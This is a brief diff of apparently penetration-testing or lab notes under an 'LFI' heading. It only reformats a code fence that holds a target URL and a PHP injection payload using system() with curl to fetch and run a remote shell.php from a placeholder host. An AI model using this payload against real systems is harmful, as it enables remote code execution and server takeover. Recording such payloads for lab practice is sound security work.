@@ -6,7 +6,8 @@
 
 ----------------------------------------------------
 # LFI 
-```http://192.168.141.94/index.php?page=gallery
+```
+http://192.168.141.94/index.php?page=gallery
 
 ' and die(system("curl http://<ip>/shell.php|php")) or '
 ```
